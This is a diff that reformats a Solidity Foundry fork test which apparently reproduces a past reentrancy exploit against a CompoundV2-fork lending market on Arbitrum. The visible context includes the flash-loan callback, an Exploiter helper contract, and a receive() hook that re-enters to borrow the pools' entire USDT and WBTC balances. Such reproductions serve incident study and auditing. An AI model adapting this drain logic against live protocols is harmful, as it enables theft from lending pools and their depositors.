@@ -14,12 +14,7 @@ import "./interface.sol";
 // a known reentrancy issue from the forked old version of CompoundV2
 
 interface CurvePool {
-    function exchange(
-    uint256 i,
-    uint256 j,
-    uint256 dx,
-    uint256 min_dy
-  ) external;
+    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;
 }
 
 contract ContractTest is Test {
@@ -38,7 +33,7 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("arbitrum", 79308097);
+        cheats.createSelectFork("arbitrum", 79_308_097);
         cheats.label(address(WBTC), "WBTC");
         cheats.label(address(USDT), "USDT");
         cheats.label(address(WETH), "WETH");
@@ -50,7 +45,6 @@ contract ContractTest is Test {
     }
 
     function testExploit() external {
-        
         payable(address(0)).transfer(address(this).balance);
         address[] memory assets = new address[](2);
         assets[0] = address(WETH);
@@ -76,10 +70,10 @@ contract ContractTest is Test {
         address initiator,
         bytes calldata params
     ) external payable returns (bool) {
-        USDT.approve(address(aaveV3), type(uint).max);
-        WETH.approve(address(aaveV3), type(uint).max);
-        USDT.approve(address(pUSDT), type(uint).max);
-        WBTC.approve(address(pWBTC), type(uint).max);
+        USDT.approve(address(aaveV3), type(uint256).max);
+        WETH.approve(address(aaveV3), type(uint256).max);
+        USDT.approve(address(pUSDT), type(uint256).max);
+        WBTC.approve(address(pWBTC), type(uint256).max);
 
         exploiter = new Exploiter();
         WETH.transfer(address(exploiter), 100 * 1e18);
@@ -89,7 +83,7 @@ contract ContractTest is Test {
         WETH.withdraw(WETH.balanceOf(address(this)));
         payable(address(pETH)).call{value: address(this).balance}("");
         pUSDT.mint(USDT.balanceOf(address(this)));
-        address [] memory cTokens = new address[](2);
+        address[] memory cTokens = new address[](2);
         cTokens[0] = address(pETH);
         cTokens[1] = address(pUSDT);
         unitroller.enterMarkets(cTokens);
@@ -102,7 +96,7 @@ contract ContractTest is Test {
     }
 
     receive() external payable {
-        if(nonce == 2){
+        if (nonce == 2) {
             pUSDT.borrow(USDT.balanceOf(address(pUSDT)));
             pWBTC.borrow(WBTC.balanceOf(address(pWBTC)));
         }
@@ -110,17 +104,17 @@ contract ContractTest is Test {
     }
 
     function exchangeUSDTWBTC() internal {
-        USDT.approve(address(curvePool), type(uint).max);
-        WBTC.approve(address(curvePool), type(uint).max);
+        USDT.approve(address(curvePool), type(uint256).max);
+        WBTC.approve(address(curvePool), type(uint256).max);
         curvePool.exchange(0, 2, USDT.balanceOf(address(this)), 0);
         curvePool.exchange(1, 2, WBTC.balanceOf(address(this)), 0);
     }
-
 }
 
-contract Exploiter is Test{
+contract Exploiter is Test {
     IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
     ICErc20Delegate pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);
+
     function mint() external payable {
         WETH.withdraw(WETH.balanceOf(address(this)));
         payable(address(pETH)).call{value: address(this).balance}("");
@@ -132,5 +126,5 @@ contract Exploiter is Test{
         WETH.transfer(msg.sender, WETH.balanceOf(address(this)));
     }
 
-    receive() external payable{}
+    receive() external payable {}
 }
